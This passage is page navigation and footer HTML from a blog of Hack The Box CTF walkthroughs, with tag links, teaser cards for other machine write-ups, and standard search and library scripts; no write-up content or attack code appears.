Walkthrough</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/blog/">blog</a> <a class="post-tag" href="/tags/c/">c</a> <a class="post-tag" href="/tags/discovery/">discovery</a> <a class="post-tag" href="/tags/edr/">edr</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTB-Tabby/"><div class="card-body"> <em class="timeago small" data-ts="1593626400" > 2020-07-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Tabby</h3><div class="text-muted small"><p> This is my write up for the HackTheBox Linux machine Tabby. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t at...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-Cache/"><div class="card-body"> <em class="timeago small" data-ts="1593885600" > 2020-07-04 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack the Box - Cache</h3><div class="text-muted small"><p> This is my guide to the HackTheBox Linux machine Cache. These HTB writeups have been migrated from a standalone repository for ease of access. However, I wrote these to learn and can’t attest...</p></div></div></a></div><div class="card"> <a href="/posts/HTB-OpenAdmin/"><div class="card-body"> <em class="timeago small" data-ts="1585332000" > 2020-03-27 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - OpenAdmin</h3><div class="text-muted small"><p> This write-up is an attempt to show my process of achieving root in the HackTheBox machine OpenAdmin. These HTB writeups have been migrated from a standalone repository for ease of access. Ho...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTB-ServMon/" class="btn btn-outline-primary" prompt="Older"><p>Hack The Box - ServMon</p></a> <a href="/posts/HTB-Resolute/" class="btn btn-outline-primary" prompt="Newer"><p>Hack the Box - Resolute</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/username">Chris</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/walkthrough/">walkthrough</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/blog/">blog</a> <a class="post-tag" href="/tags/c/">c</a> <a class="post-tag" href="/tags/discovery/">discovery</a> <a class="post-tag" href="/tags/edr/">edr</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
